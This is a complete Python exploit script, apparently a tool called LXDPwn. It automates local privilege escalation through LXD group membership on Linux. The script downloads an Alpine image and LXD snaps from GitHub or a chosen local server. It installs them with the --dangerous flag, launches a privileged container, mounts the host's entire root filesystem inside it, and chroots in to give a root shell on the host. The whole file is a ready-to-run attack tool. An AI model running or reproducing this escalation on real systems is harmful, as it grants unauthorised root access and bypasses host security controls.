#!/usr/bin/env python3

import requests
import os
import hashlib
import sys
import subprocess
import pwd
import grp
import time
import re

class S:
    H = '\033[95m'
    B = '\033[94m'
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    C = '\033[96m'
    M = '\033[95m'
    W = '\033[97m'
    O = '\033[1m'
    U = '\033[4m'
    E = '\033[0m'
    

    INFO = "ℹ "
    SUCCESS = "✓ "
    ERROR = "✗ "
    WARNING = "⚠ "
    DOWNLOAD = "↓ "
    INSTALL = "⚙ "
    CONTAINER = "📦"
    SHELL = "💻 "
    CLEAN = "🧹"
    WAIT = "⏳"
    ARROW = "→ "
    STAR = "⭐ "
    GITHUB = "🐙 "

def print_banner():
   
    banner = S.R+"""
               

 _    __  ______  ______        ___   _ 
| |   \\ \\/ /  _ \\|  _ \\ \\      / / \\ | |
| |    \\  /| | | | |_) \\\\ /\\ / /|  \\| |
| |___ /  \\| |_| |  __/ \\ V  V / | |\\  |
|_____/_/\\_\\____/|_|     \\_/\\_/  |_| \\_|
               @jacstory

"""
    print(banner)

def print_step(icon, color, step, message):

    print(f"{color}{icon} {S.O}{step:12}{S.E} {color}│{S.E} {message}{S.E}")

def print_substep(message):
 
    print(f"    {S.C}└─{S.E} {message}")

def print_progress_bar(current, total, filename, bar_length=30):
 
    percent = float(current) * 100 / total
    filled = int(bar_length * current // total)
    bar = '█' * filled + '░' * (bar_length - filled)
    
  
    current_mb = current / (1024 * 1024)
    total_mb = total / (1024 * 1024)
    
    sys.stdout.write(f"\r    {S.C}↓{S.E} {S.O}{filename[:25]:25}{S.E} "
                     f"{S.G}[{bar}]{S.E} "
                     f"{S.W}{percent:5.1f}%{S.E} "
                     f"{S.M}({current_mb:5.1f}/{total_mb:5.1f} MB){S.E}")
    sys.stdout.flush()

def print_section(title):

    print()
    print(f"{S.Y}{S.O}═══ {title} ═══{S.E}")
    print()

def print_success_box(message):

    length = len(message) + 6
    print(f"{S.G}┌{'─' * length}┐{S.E}")
    print(f"{S.G}│  {message}  │{S.E}")
    print(f"{S.G}└{'─' * length}┘{S.E}")
# Python 3.6 and older compatibility
if not hasattr(subprocess, 'run'):
    print_step(S.ERROR, S.R, "ERROR", "Python 3.5+ required")
    sys.exit(1)

# Create a wrapper function that handles text/universal_newlines
def run_cmd_compat(cmd, **kwargs):
    if 'text' in kwargs:
        kwargs['universal_newlines'] = kwargs.pop('text')
    if 'capture_output' in kwargs:
        kwargs['stdout'] = subprocess.PIPE
        kwargs['stderr'] = subprocess.PIPE
        del kwargs['capture_output']
    return subprocess.run(cmd, **kwargs)    

class LXD_Helper:
    def __init__(self):
  
        print_banner()
        self.download_path = "/tmp/alpine"
        os.makedirs(self.download_path, exist_ok=True)

        self.need_sudo = False           # For LXD commands (lxc, lxd, snap)
        self.need_sudo_for_system = False # For system commands (apt, dpkg, usermod)
        self.online_mode = False
        self.lxd_installed = False
        self.lxd_initialized = False
        self.snap_available = False
        self.glibc_version = self.get_glibc_version()
        
        print_section("INITIALIZATION")
        print_step(S.INFO, S.B, "WORKSPACE", f"Download directory: {self.download_path}")
        if self.glibc_version:
            print_substep(f"System glibc: {self.glibc_version}")
        print()

        self.Check_compatibility()
        
        print(f"    {S.C}────────────────────────────────────────────{S.E}")
        print()
        
        # Check if snap is available
        self.check_snap_availability()
        
        self.Check_LXD_Status()
        
        # Check if Alpine image exists
        alpine_path = os.path.join(self.download_path, "alpine-v3.13-x86_64-20210218_0139.tar.gz")
        alpine_exists = os.path.exists(alpine_path)
        
        # If LXD is already installed AND Alpine image exists, skip to container
        if self.lxd_installed and self.lxd_initialized and alpine_exists:
            print_section("CONTAINER SETUP")
            self.ImageLoad(alpine_path)
            return  # Exit early
        
        # Otherwise, continue with network and download
        print_section("NETWORK CONFIGURATION")
        self.online_mode = self.check_connection()
        
        # Set base URL
        if self.online_mode:
            base_url = "https://github.com/jac11/LXDPwn/releases/download/LXDPwn/"
        else:
            base_url = self.get_offline_server()
            
        print_section("FILE DOWNLOAD")
        self.download_files(base_url)
        
        # Check again after download
        if not os.path.exists(alpine_path):
            print_step(S.ERROR, S.R, "ERROR", "Alpine image not found! Cannot continue.")
            sys.exit(1)
        
        # Only install LXD if not already installed
        if not (self.lxd_installed and self.lxd_initialized):
            print_section("LXD INSTALLATION")
            self.Set_LXD()
        
        # Proceed with container
        if self.lxd_installed and self.lxd_initialized:
            print_section("CONTAINER SETUP")
            self.ImageLoad(alpine_path)
        else:
            print_step(S.ERROR, S.R, "ERROR", "LXD installation failed - cannot setup container")
            print_substep("Try installing LXD manually: sudo apt install lxd lxd-client")

    def get_glibc_version(self):
        """Get system glibc version"""
        try:
            result = subprocess.run(["ldd", "--version"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   universal_newlines=True)
            version_match = re.search(r'(\d+\.\d+)', result.stdout)
            if version_match:
                return version_match.group(1)
        except:
            pass
        return None

    def check_snap_availability(self):
        """Check if snap is available on the system"""
        print_step(S.INFO, S.B, "SNAP", "Checking snap availability...")
        
        try:
            # Check if snap command exists
            result = subprocess.run(["which", "snap"], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE)
            if result.returncode == 0:
                # Check if snapd is actually working
                result = subprocess.run(["snap", "version"], 
                                              stdout=subprocess.PIPE, 
                                              stderr=subprocess.PIPE,
                                              universal_newlines=True)
                if result.returncode == 0:
                    self.snap_available = True
                    print_step(S.SUCCESS, S.G, "SNAP", "Snap is available")
                    return True
        except:
            pass
        
        self.snap_available = False
        print_step(S.WARNING, S.Y, "SNAP", "Snap is NOT available")
        return False

    def check_sudo_access(self):
        """Check if user has sudo access and cache password once"""
        print_step(S.INFO, S.B, "SUDO", "Checking sudo access...")
        
        try:
            # Test if sudo is already cached
            subprocess.run(["sudo", "-n", "true"], 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL, 
                          check=True)
            print_step(S.SUCCESS, S.G, "SUDO", "Sudo access available (cached)")
            print()
            return True
        except subprocess.CalledProcessError:
            # Need to ask for password once
            print_step(S.WARNING, S.Y, "SUDO", "Password required for some operations")
            print()
            
            # Ask for password once using sudo -v (updates timestamp)
            try:
                result = subprocess.run(["sudo", "-v"], 
                                       stderr=subprocess.PIPE,
                                       universal_newlines=True)
                
                if result.returncode == 0:
                    print_step(S.SUCCESS, S.G, "SUDO", "Authentication successful")
                    print()
                    return True
                else:
                    print_step(S.ERROR, S.R, "SUDO", "Authentication failed")
                    return False
                    
            except KeyboardInterrupt:
                print()
                print_step(S.ERROR, S.R, "SUDO", "Authentication cancelled")
                sys.exit(1)
            except Exception as e:
                print_step(S.ERROR, S.R, "SUDO", f"Error: {str(e)}")
                return False
                
    def run_cmd(self, cmd, **kwargs):
        """Run command with sudo only for system commands"""
        system_cmds = ['apt', 'apt-get', 'dpkg', 'usermod', 'systemctl']
        
        # Convert text to universal_newlines for older Python
        if 'text' in kwargs:
            kwargs['universal_newlines'] = kwargs.pop('text')
        
        # Handle capture_output for older Python
        if 'capture_output' in kwargs:
            kwargs['stdout'] = subprocess.PIPE
            kwargs['stderr'] = subprocess.PIPE
            del kwargs['capture_output']
        
        # Add sudo only for system commands when needed
        if cmd[0] in system_cmds and self.need_sudo_for_system:
            if cmd[0] != "sudo":
                cmd = ["sudo"] + cmd
        elif self.need_sudo and cmd[0] != "sudo":
            # For backward compatibility
            cmd = ["sudo"] + cmd
            
        return subprocess.run(cmd, **kwargs)
    
    def run_cmd_quiet(self, cmd, **kwargs):
        """Run command quietly with no output"""
        system_cmds = ['apt', 'apt-get', 'dpkg', 'usermod', 'systemctl']
        
        # Convert text to universal_newlines for older Python
        if 'text' in kwargs:
            kwargs['universal_newlines'] = kwargs.pop('text')
        
        # Handle capture_output for older Python
        if 'capture_output' in kwargs:
            kwargs['stdout'] = subprocess.PIPE
            kwargs['stderr'] = subprocess.PIPE
            del kwargs['capture_output']
        
        # Add sudo only for system commands when needed
        if cmd[0] in system_cmds and self.need_sudo_for_system:
            if cmd[0] != "sudo":
                cmd = ["sudo"] + cmd
        elif self.need_sudo and cmd[0] != "sudo":
            cmd = ["sudo"] + cmd
        
        if 'stdout' not in kwargs:
            kwargs['stdout'] = subprocess.DEVNULL
        if 'stderr' not in kwargs:
            kwargs['stderr'] = subprocess.DEVNULL
            
        return subprocess.run(cmd, **kwargs)
    
    def run_lxc_cmd(self, cmd, **kwargs):
        """Run LXC/LXD commands without sudo (lxd group users don't need sudo)"""
        # Convert text to universal_newlines for older Python
        if 'text' in kwargs:
            kwargs['universal_newlines'] = kwargs.pop('text')
        
        # Handle capture_output for older Python
        if 'capture_output' in kwargs:
            kwargs['stdout'] = subprocess.PIPE
            kwargs['stderr'] = subprocess.PIPE
            del kwargs['capture_output']
        
        # Never add sudo for LXC commands
        return subprocess.run(cmd, **kwargs)
        
    def cleanup(self):
        print_step(S.CLEAN, S.Y, "CLEANUP", "Stopping and removing containers...")
        # Use run_lxc_cmd for LXC commands (no sudo)
        self.run_lxc_cmd(["lxc", "stop", "alpine-container", "--force"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.run_lxc_cmd(["lxc", "delete", "alpine-container"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.run_lxc_cmd(["lxc", "image", "delete", "alpine-local"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_step(S.SUCCESS, S.G, "DONE", "Cleanup completed successfully")
    
    def Check_compatibility(self):
       
        print_step(S.INFO, S.B, "SYSTEM", "Checking system compatibility...")
        
        username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
        user_info = pwd.getpwnam(username)
        groups = [
            g.gr_name for g in grp.getgrall()
            if username in g.gr_mem or g.gr_gid == user_info.pw_gid
        ]
        
        print_substep(f"User: {username}")
        print_substep(f"Groups: {', '.join(groups)}")
        
        is_root = os.geteuid() == 0
        in_lxd_group = "lxd" in groups
        
        if is_root:
            print_step(S.SUCCESS, S.G, "OK", "Running as root — full access granted")
            self.need_sudo = False
            self.need_sudo_for_system = False
            return True
        elif in_lxd_group:
            print_step(S.SUCCESS, S.G, "OK", f"User in lxd group — container access granted")
            # LXD commands don't need sudo for lxd group users
            self.need_sudo = False
            # System commands still need sudo
            self.need_sudo_for_system = True
            return True
        else:
            print_step(S.ERROR, S.R, "ERROR", f"User {username} not in lxd group and not root")
            print_substep("Add user to lxd group: sudo usermod -aG lxd " + username)
            print_substep("Then log out and back in")
            sys.exit(1)

    def check_connection(self):
        print_step(S.INFO, S.B, "NETWORK", "Checking internet connection...")
        try:
            requests.get("https://github.com", timeout=5)
            print_step(S.SUCCESS, S.G, "ONLINE", "Connection established")
            return True
        except requests.RequestException:
            print_step(S.WARNING, S.Y, "OFFLINE", "No internet connection detected")
            return False

    def get_offline_server(self):
        print_step(S.INFO, S.B, "SERVER", "Configure offline server")
        print()
        print(f"    {S.C}┌─{S.E} {S.O}Offline Server Configuration{S.E}")
        print(f"    {S.C}├─{S.E} {S.Y}Start your local web server first{S.E}")
        print(f"    {S.C}├─{S.E} Example: {S.G}python3 -m http.server 8000{S.E}")
        print(f"    {S.C}└─{S.E}")
        print()
        
        server_ip = input(f"    {S.C}└─ Enter server IP{S.E} : ").strip()
        try:
            server_port = int(input(f"    {S.C}└─ Enter Port (default 80){S.E}: "))
        except ValueError:
            server_port = 80
            
        print()
        print_step(S.SUCCESS, S.G, "SERVER", f"Configured: {S.O}{server_ip}:{server_port}{S.E}")
        return f"http://{server_ip}:{server_port}/"

    def download_files(self, base_url):
 
        print_step(S.DOWNLOAD, S.C, "START", "Downloading required files...")
        print()

        files = {
            "alpine-v3.13-x86_64-20210218_0139.tar.gz": "Alpine Linux",
            "core_17272.assert": "Core Assert",
            "core_17272.snap": "Core Snap",
            "lxd_37395.assert": "LXD Assert",
            "lxd_37395.snap": "LXD Snap",
            "snapd_2.71-3+b1_amd64.deb": "Snapd",
        }

        total_files = len(files)
        completed = 0
        total_bytes = 0
        
        print(f"    {S.C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{S.E}")
        print()
        
        for filename, short_name in files.items():
            save_path = os.path.join(self.download_path, filename)

            if os.path.exists(save_path) and os.path.getsize(save_path) > 0:
                file_size = os.path.getsize(save_path)
                total_bytes += file_size
                print(f"    {S.G}✔{S.E} {short_name:15} {S.W}{file_size/1024/1024:5.1f} MB{S.E} {S.G}(cached){S.E}")
                completed += 1
                continue
         
                
            try:
                response = requests.get(base_url + filename, stream=True, timeout=15)
                response.raise_for_status()
                
                total_size = int(response.headers.get('content-length', 0))
                downloaded = 0

                sys.stdout.write(f"    {S.C}↓{S.E} {short_name:15} ")
                sys.stdout.write(f"{S.W}[{S.E}{'░' * 20}{S.W}]{S.E} 0%")
                sys.stdout.flush()

                with open(save_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                            if total_size > 0:
                                percent = int(20 * downloaded / total_size)
                                bar = '█' * percent + '░' * (20 - percent)
                                
                                sys.stdout.write(f"\r    {S.C}↓{S.E} {short_name:15} ")
                                sys.stdout.write(f"{S.G}[{bar}]{S.E} ")
                                sys.stdout.write(f"{S.W}{int(100 * downloaded / total_size):3d}%{S.E}")
                                sys.stdout.flush()
                
                sys.stdout.write(f"\r    {S.G}✓{S.E} {short_name:15} ")
                sys.stdout.write(f"{S.G}[{'█' * 20}]{S.E} ")
                sys.stdout.write(f"{S.W}100%{S.E} ")
                sys.stdout.write(f"{S.M}({downloaded/1024/1024:5.1f} MB){S.E}\n")
                
                total_bytes += downloaded
                completed += 1

            except requests.RequestException as e:
                sys.stdout.write(f"\r    {S.R}✗{S.E} {short_name:15} {S.R}Failed{S.E}\n")
                print_substep(f"Error: {str(e)[:50]}")

        print()
        print(f"    {S.C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{S.E}")
        print_step(S.SUCCESS, S.G, "SUMMARY", f"Downloaded {completed}/{total_files} files")
        print_substep(f"Total size: {S.M}{total_bytes/(1024*1024):.1f} MB{S.E}")
        
    def Check_LXD_Status(self):
        print_step(S.INFO, S.B, "STATUS", "Checking LXD installation status...")
        
        self.snap_installed = False
        self.lxd_installed = False
        self.lxd_initialized = False
        
        # Check if snapd is installed
        try:
            # Use run_lxc_cmd for snap commands (no sudo for lxd group users)
            result = subprocess.run(["snap", "version"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   universal_newlines=True)
            if result.returncode == 0:
                version = result.stdout.split('\n')[0].split()[-1] if result.stdout else "unknown"
                print_step(S.SUCCESS, S.G, "SNAP", f"snapd is installed (v{version})")
                self.snap_installed = True
            else:
                print_step(S.WARNING, S.Y, "SNAP", "snapd not installed")
        except:
            print_step(S.WARNING, S.Y, "SNAP", "snapd not installed")
   
        # Check if LXD is installed
        try:
            # Use run_lxc_cmd for lxc commands (no sudo)
            result = subprocess.run(["lxc", "info"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   universal_newlines=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if "version" in line.lower():
                        version = line.split(':')[-1].strip()
                        print_step(S.SUCCESS, S.G, "LXD", f"LXD is installed (v{version})")
                        self.lxd_installed = True
                        break
                
                if "storage" in result.stdout.lower() or "images" in result.stdout.lower():
                    print_step(S.SUCCESS, S.G, "INIT", "LXD is initialized")
                    self.lxd_initialized = True
                else:
                    print_step(S.WARNING, S.Y, "INIT", "LXD not initialized")
            else:
                print_step(S.WARNING, S.Y, "LXD", "LXD not installed")
        except:
            print_step(S.WARNING, S.Y, "LXD", "LXD not installed")
            
        if self.lxd_installed and self.lxd_initialized:
            print_step(S.SUCCESS, S.G, "READY", "LXD is fully ready")
        else:
            print_step(S.INFO, S.B, "NEXT", "Installation required")

            
    def Set_LXD(self):
        print_step(S.INSTALL, S.M, "BEGIN", "Starting LXD installation...")
        print()
        
        # Check if already installed
        if self.lxd_installed and self.lxd_initialized:
            print_step(S.SUCCESS, S.G, "OK", "LXD already installed and initialized")
            return
        
        # Check if snapd is installed
        snapd_installed = False
        try:
            subprocess.run(["snap", "version"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            snapd_installed = True
            print_substep("Snapd is already installed")
        except:
            print_substep("Snapd not installed")
        
        # Install snapd if not installed
        if not snapd_installed:
            if self.online_mode:
                # ONLINE: Use apt to install snapd (handles dependencies)
                print_substep("Online mode - installing snapd via apt...")
                try:
                    self.run_cmd_quiet(["apt", "update"], check=True)
                    self.run_cmd_quiet(["apt", "install", "snapd", "-y"], check=True)
                    print_substep("Snapd installed via apt")
                    
                    # Wait for snapd to be ready
                    time.sleep(3)
                    
                except subprocess.CalledProcessError as e:
                    print_step(S.ERROR, S.R, "ERROR", f"Failed to install snapd: {e}")
                    return False
            else:
                # OFFLINE: Try to install from local .deb
                snapd_deb = None
                for f in os.listdir(self.download_path):
                    if f.startswith("snapd") and f.endswith(".deb"):
                        snapd_deb = os.path.join(self.download_path, f)
                        break
                
                if snapd_deb:
                    print_substep(f"Offline mode - installing snapd from {os.path.basename(snapd_deb)}...")
                    try:
                        self.run_cmd_quiet(["dpkg", "-i", snapd_deb], check=False)
                        self.run_cmd_quiet(["apt-get", "install", "-f", "-y"], check=True)
                        print_substep("Snapd installed from local file")
                        time.sleep(3)
                    except:
                        print_step(S.ERROR, S.R, "ERROR", "Failed to install snapd from local file")
                        return False
                else:
                    print_step(S.ERROR, S.R, "ERROR", "No snapd package found for offline installation")
                    print_substep(f"Please place a snapd .deb file in {self.download_path}")
                    return False
        
        # Verify snapd is working
        try:
            subprocess.run(["snap", "version"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            print_substep("Snapd is working")
        except:
            print_step(S.ERROR, S.R, "ERROR", "Snapd installed but not responding")
            return False
        
        # Now install LXD from local snap files
        core_assert = os.path.join(self.download_path, "core_17272.assert")
        core_snap = os.path.join(self.download_path, "core_17272.snap")
        lxd_assert = os.path.join(self.download_path, "lxd_37395.assert")
        lxd_snap = os.path.join(self.download_path, "lxd_37395.snap")
        
        # Check if all files exist
        missing_files = []
        for f, name in [(core_assert, "core assert"), (core_snap, "core snap"), 
                        (lxd_assert, "lxd assert"), (lxd_snap, "lxd snap")]:
            if not os.path.exists(f):
                missing_files.append(name)
        
        if missing_files:
            print_step(S.ERROR, S.R, "ERROR", f"Missing files: {', '.join(missing_files)}")
            return False
        
        # Install core snap with --dangerous flag
        print(f"    {S.C}[1/5]{S.E} Installing core snap... ", end="", flush=True)
        try:
            subprocess.run(["snap", "ack", core_assert], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            # Use --dangerous for local snap file
            subprocess.run(["snap", "install", "--dangerous", core_snap], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            print(f"{S.G}✓{S.E}")
        except subprocess.CalledProcessError as e:
            print(f"{S.R}✗{S.E}")
            # Try without --dangerous as fallback
            print_substep("Retrying without --dangerous...")
            try:
                subprocess.run(["snap", "install", core_snap], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                             check=True)
                print(f"    {S.C}   └─{S.E} {S.G}✓{S.E}")
            except:
                print_substep(f"Error: {e}")
                return False
        
        # Install LXD snap with --dangerous flag
        print(f"    {S.C}[2/5]{S.E} Installing LXD snap... ", end="", flush=True)
        try:
            subprocess.run(["snap", "ack", lxd_assert], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            # Use --dangerous for local snap file
            subprocess.run(["snap", "install", "--dangerous", lxd_snap], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            print(f"{S.G}✓{S.E}")
        except subprocess.CalledProcessError as e:
            print(f"{S.R}✗{S.E}")
            # Try without --dangerous as fallback
            print_substep("Retrying without --dangerous...")
            try:
                subprocess.run(["snap", "install", lxd_snap], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                             check=True)
                print(f"    {S.C}   └─{S.E} {S.G}✓{S.E}")
            except:
                print_substep(f"Error: {e}")
                return False
        
        # Connect LXD (optional)
        print(f"    {S.C}[3/5]{S.E} Connecting LXD... ", end="", flush=True)
        try:
            subprocess.run(["snap", "connect", "lxd:lxd", "core:lxd"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=False)
            print(f"{S.G}✓{S.E}")
        except:
            print(f"{S.Y}⚠{S.E}")
        
        # Initialize LXD
        print(f"    {S.C}[4/5]{S.E} Initializing LXD... ", end="", flush=True)
        try:
            subprocess.run(["lxd", "init", "--auto"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            print(f"{S.G}✓{S.E}")
        except:
            print(f"{S.R}✗{S.E}")
            return False
        
        # Add user to lxd group
        print(f"    {S.C}[5/5]{S.E} Adding user to lxd group... ", end="", flush=True)
        try:
            username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
            self.run_cmd_quiet(["usermod", "-aG", "lxd", username], check=True)
            print(f"{S.G}✓{S.E}")
        except:
            print(f"{S.Y}⚠{S.E}")
        
        print_step(S.SUCCESS, S.G, "DONE", "LXD installed successfully")
        self.lxd_installed = True
        self.lxd_initialized = True
        return True
        
    def install_lxd_via_snap(self):
        """Install LXD using snap packages"""
        commands = []
        
        # Check if we need to install snapd
        if not self.snap_installed:
            # Find snapd file
            snapd_file = None
            for f in os.listdir(self.download_path):
                if f.startswith("snapd") and f.endswith(".deb"):
                    snapd_file = os.path.join(self.download_path, f)
                    break
            
            if snapd_file:
                commands.append({
                    "cmd": ["dpkg", "-i", snapd_file],
                    "desc": f"Installing {os.path.basename(snapd_file)}"
                })
            else:
                print_step(S.WARNING, S.Y, "SNAP", "No snapd package found")
                return False
        
        # Add snap commands if files exist
        core_assert = os.path.join(self.download_path, "core_17272.assert")
        core_snap = os.path.join(self.download_path, "core_17272.snap")
        lxd_assert = os.path.join(self.download_path, "lxd_37395.assert")
        lxd_snap = os.path.join(self.download_path, "lxd_37395.snap")
        
        if os.path.exists(core_assert) and os.path.exists(core_snap):
            commands.extend([
                {
                    "cmd": ["snap", "ack", core_assert],
                    "desc": "Acknowledging core snap"
                },
                {
                    "cmd": ["snap", "install", core_snap],
                    "desc": "Installing core snap"
                }
            ])
        
        if os.path.exists(lxd_assert) and os.path.exists(lxd_snap):
            commands.extend([
                {
                    "cmd": ["snap", "ack", lxd_assert],
                    "desc": "Acknowledging LXD snap"
                },
                {
                    "cmd": ["snap", "install", lxd_snap],
                    "desc": "Installing LXD snap"
                }
            ])

        if not commands:
            print_step(S.ERROR, S.R, "ERROR", "No snap packages found")
            return False

        for i, cmd_info in enumerate(commands, 1):
            cmd = cmd_info["cmd"]
            desc = cmd_info["desc"]
            
            print(f"    {S.C}[{i}/{len(commands)}]{S.E} {desc}... ", end="", flush=True)
            
            try:
                # For dpkg, handle dependencies
                if cmd[0] == "dpkg":
                    result = self.run_cmd(cmd, 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, 
                                        check=False)
                    if result.returncode != 0:
                        print(f"{S.Y}⚠{S.E}")
                        print_substep("Fixing dependencies...")
                        self.run_cmd_quiet(["apt-get", "install", "-f", "-y"], check=False)
                        self.run_cmd_quiet(cmd, check=True)
                    else:
                        print(f"{S.G}✓{S.E}")
                else:
                    # For snap commands, no sudo needed for lxd group users
                    subprocess.run(cmd, 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                                 check=True)
                    print(f"{S.G}✓{S.E}")
                    
            except subprocess.CalledProcessError:
                print(f"{S.R}✗{S.E}")
                return False

        # Initialize LXD
        print(f"    {S.C}[{len(commands)+1}/{len(commands)+1}]{S.E} Initializing LXD... ", end="", flush=True)
        try:
            subprocess.run(["lxd", "init", "--auto"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            print(f"{S.G}✓{S.E}")
            print_step(S.SUCCESS, S.G, "DONE", "LXD installed via snap")
            self.lxd_installed = True
            self.lxd_initialized = True
            return True
        except:
            print(f"{S.R}✗{S.E}")
            return False
    
    def install_lxd_via_apt(self):
        """Install LXD using apt"""
        steps = [
            ("Updating package list", ["apt", "update"]),
            ("Installing LXD", ["apt", "install", "lxd", "lxd-client", "-y"]),
            ("Adding user to lxd group", ["usermod", "-aG", "lxd"]),
            ("Initializing LXD", ["lxd", "init", "--auto"])
        ]
        
        total_steps = len(steps)
        success = True
        
        for i, (desc, cmd) in enumerate(steps, 1):
            print(f"    {S.C}[{i}/{total_steps}]{S.E} {desc}... ", end="", flush=True)
            
            if cmd[0] == "usermod":
                username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
                full_cmd = cmd + [username]
            else:
                full_cmd = cmd
            
            try:
                # For apt commands, use run_cmd_quiet (handles sudo)
                if cmd[0] in ['apt', 'apt-get']:
                    self.run_cmd_quiet(full_cmd, check=True)
                else:
                    # For lxd init, no sudo needed
                    subprocess.run(full_cmd, 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                                 check=True)
                print(f"{S.G}✓{S.E}")
            except subprocess.CalledProcessError:
                print(f"{S.R}✗{S.E}")
                if i == 1:  # apt update failed
                    success = False
                    break
        
        if success:
            print_step(S.SUCCESS, S.G, "DONE", "LXD installed via apt")
            self.lxd_installed = True
            self.lxd_initialized = True
        else:
            print_step(S.ERROR, S.R, "FAIL", "LXD installation failed")
            
    def ImageLoad(self, imagepath):
        print_step(S.CONTAINER, S.C, "START", "Setting up container...")
        print()

        print_step(S.INSTALL, S.M, "LXD", "Ensuring LXD is initialized...")
        try:
            # lxd init doesn't need sudo for lxd group users
            subprocess.run(["lxd", "init", "--auto"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         check=True)
            print_step(S.SUCCESS, S.G, "OK", "LXD is ready")
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "LXD initialization failed")
            return

        print_step(S.DOWNLOAD, S.C, "IMAGE", "Checking Alpine image...")
        result = subprocess.run(["lxc", "image", "list", "alpine-local", "--format", "json"], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                               universal_newlines=True)
        if result.returncode == 0 and 'alpine-local' in result.stdout:
            print_step(S.SUCCESS, S.G, "EXISTS", "Image already loaded")
        else:
            print_step(S.DOWNLOAD, S.C, "IMPORT", "Importing Alpine image...")
            try:
                result = subprocess.run(["lxc", "image", "import", imagepath, "--alias", "alpine-local"], 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
                print_step(S.SUCCESS, S.G, "IMPORT", "Image imported successfully")
            except subprocess.CalledProcessError:
                print_step(S.ERROR, S.R, "FAIL", "Image import failed")
                return

        print_step(S.CONTAINER, S.C, "LAUNCH", "Launching privileged container...")
        try:
            result = subprocess.run([
                "lxc", "launch",
                "alpine-local",
                "alpine-container",
                "-c", "security.privileged=true",
                "-c", "security.nesting=true"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
               universal_newlines=True, check=False)  # Changed check=True to check=False
            
            if result.returncode != 0:
                print_step(S.ERROR, S.R, "FAIL", "Container launch failed")
                print_substep(f"Error: {result.stderr.strip()}")
                print_substep("Checking for existing container...")
                
                # Check if container already exists
                check = subprocess.run(["lxc", "list", "alpine-container", "--format", "json"],
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      universal_newlines=True)
                if 'alpine-container' in check.stdout:
                    print_substep("Container already exists, trying to use it...")
                else:
                    # Check if image exists
                    image_check = subprocess.run(["lxc", "image", "list", "alpine-local", "--format", "json"],
                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                universal_newlines=True)
                    if 'alpine-local' not in image_check.stdout:
                        print_substep("Image 'alpine-local' not found!")
                    return
            else:
                print_step(S.SUCCESS, S.G, "START", "Container is running")
          
            status = subprocess.run(["lxc", "list", "alpine-container", "--format", "json"],
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                  universal_newlines=True)
            print_substep(f"Container: {S.O}alpine-container{S.E}")
            
        except Exception as e:
            print_step(S.ERROR, S.R, "FAIL", f"Container launch failed: {str(e)}")
            return

        print_step(S.INSTALL, S.M, "MOUNT", "Mounting host filesystem...")
        try:
            result = subprocess.run([
                "lxc", "config", "device", "add",
                "alpine-container",
                "host-root",
                "disk",
                "source=/",
                "path=/mnt/root",
                "recursive=true"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
               universal_newlines=True, check=True)
            print_step(S.SUCCESS, S.G, "MOUNT", "Host filesystem mounted at /mnt/root")
            
            try:
                subprocess.run(
                    ["lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/bash"],
                    check=True
                )
            except subprocess.CalledProcessError:
                print("[!] First chroot attempt failed, trying fallback...")
                subprocess.run(
                    ["lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/bash"],
                    check=False
                )
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "Failed to mount host filesystem")
            return

        print()
        print_success_box("🎉 Container is ready! Opening shell.. 🎉")
        print()
        print(f"    {S.Y}┌─{S.E} {S.O}Container Access{S.E}")
        print(f"    {S.Y}├─{S.E} Host filesystem: {S.C}/mnt/root{S.E}")
        print(f"    {S.Y}├─{S.E} Container name: {S.C}alpine-container{S.E}")
